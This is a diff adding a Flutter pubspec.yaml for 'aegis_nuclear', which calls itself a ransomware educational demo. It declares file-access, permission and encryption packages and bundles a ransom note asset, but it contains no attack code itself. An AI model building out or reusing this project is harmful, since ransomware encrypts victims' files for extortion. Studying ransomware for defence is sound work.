@@ -1,0 +1,36 @@
+name: aegis_nuclear
+description: AEGIS Nuclear Ransomware - Educational Demo
+publish_to: 'none'
+version: 2.0.0+1
+
+environment:
+  sdk: '>=3.0.0 <4.0.0'
+
+dependencies:
+  flutter:
+    sdk: flutter
+  
+  # File & Storage
+  file_picker: ^6.1.1
+  path_provider: ^2.1.1
+  permission_handler: ^11.0.1
+  
+  # Encryption
+  encrypt: ^5.0.3
+  pointycastle: ^3.7.3
+  
+  # UI & Animations
+  animations: ^2.0.8
+  flutter_localizations:
+    sdk: flutter
+
+dev_dependencies:
+  flutter_test:
+    sdk: flutter
+  flutter_lints: ^3.0.0
+
+flutter:
+  uses-material-design: true
+  
+  assets:
+    - assets/ransom_note.txt
